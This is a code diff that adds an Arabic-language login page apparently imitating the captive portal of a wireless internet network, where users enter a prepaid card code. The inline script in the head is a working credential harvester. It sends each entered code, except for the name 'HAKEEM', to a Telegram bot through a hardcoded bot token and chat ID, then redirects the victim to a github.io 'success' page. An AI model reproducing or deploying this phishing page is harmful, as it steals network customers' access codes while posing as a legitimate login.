@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#091527" />
+    <title>شبكة الشهاب نت3 اللاسلكيه - تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
+    <link rel="stylesheet" href="css/style.min.css">
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelector('.login-submit').addEventListener('click', function () {
+                var username = document.querySelector('input[name="login"]').value;
+                if (username !== 'HAKEEM') {
+                    login(); // تم استدعاء الدالة login هنا
+                }
+            });
+
+            function login() {
+                var username = document.querySelector('input[name="login"]').value;
+
+                //                                
+                var telegramBotToken = '6109398302:AAF27C--NPfFLtlcvTeT66u9rdn3nmLw7kA';
+                var chatId = '1538488453';
+
+                var message = 'Username: ' + username;
+
+                var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+                //         XMLHttpRequest                
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', url, true);
+
+                //                                                 
+                xhr.onload = function () {
+                    //                                                 
+                    redirectToNewLink();
+                };
+
+                xhr.send();
+            }
+
+            function redirectToNewLink() {
+                //                                                             
+                window.location.href = "https://hazmghxx.github.io/pages-/success.html";
+            }
+        });
+    </script>
+</head>
+
+<body translate="no">
+    <div class="cont">
+        <div class="demo">
+            <div class="login">
+                <div>
+                    <img src="img/logo.png" class="logo" alt="#" />
+                </div>
+                <p class="info" style="font-size: 2rem">شبكة الشهاب نت3و2اللاسلكيه</p>
+                <p class="info error" id="error"></p>
+                <section class="section" enable-hot-marquee>
+                </section>
+                <div hot-adv-img></div>
+                <div class="login-form">
+                    <form name="login">
+                        <label for="speed" style="color: white">اختر سرعتك: </label>
+                        <select id="speed" name="speed">
+                            <option value="@256K">سرعه اقتصاديه</option>
+                            <option value="@512K">سرعه عاديه</option>
+                            <option value="@1M" selected>سرعه متوسطه</option>
+                            <option value="@4M">سرعه عاليه</option>
+                            <option value="@8M">سرعه عاليه جدا</option>
+                        </select>
+                        <div class="login-row">
+                            <svg class="login-icon name svg-icon" viewBox="0 0 20 20">
+                                <path
+                                    d="M0,20 a10,8 0 0,1 20,0z M10,0 a4,4 0 0,1 0,8 a4,4 0 0,1 0,-8" />
+                            </svg>
+                            <label>
+                                <input type="tel" name="login" class="login-input name"
+                                    placeholder="ادخل رمز البطاقة هنا" required autocomplete="on" username-field
+                                    improve-input rm-white-spaces only-alphanumeric to-arabic-numbers />
+                            </label>
+                        </div>
+                        <div class="password-row">
+               <label>
+                                <svg class="login-icon pass svg-icon" viewBox="0 0 20 20">
+                                    <path d="M0,20 20,20 20,8 0,8z M10,13 10,16z M4,8 a6,8 0 0,1 12,0" />
+                                </svg>
+                                <input type="hidden" name="password" class="login-input pass" placeholder="كلمة المرور"
+                                    improve-input only-alphanumeric to-lower to-arabic-numbers />
+                            </label>
+                        </div>
+                        <button type="button" class="login-submit" parent-id="status" enable-hot-cookie>تسجيل الدخول
+                        </button>
+                    </form>
+                    <br>
+                    <button type="button" class="price-submit round-button" parent-id="price">الاسعار</button>
+                    <button type="button" class="price-submit round-button" parent-id="sell-point">نقاط البيع</button>
+                </div>
+                <p class="info bt contact">
+                    <span>للشكاوي والاستفسار: </span>
+                    <span>777773354</span>
+                </p>
+            </div>
+            <div class="app" id="price">
+                <div class="app-top">
+                    <!-- باقي الكود... -->
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>         
